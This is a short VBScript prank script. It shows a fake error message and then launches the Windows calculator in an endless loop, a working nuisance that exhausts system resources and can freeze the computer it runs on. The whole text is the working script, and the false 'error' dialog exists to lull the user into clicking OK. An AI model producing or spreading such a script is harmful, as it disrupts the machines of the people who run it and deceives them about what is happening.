msgbox "There was an error, press OK to continue"
do
Set shell=CreateObject("wscript.shell")
Shell.Run("calc.exe")
loop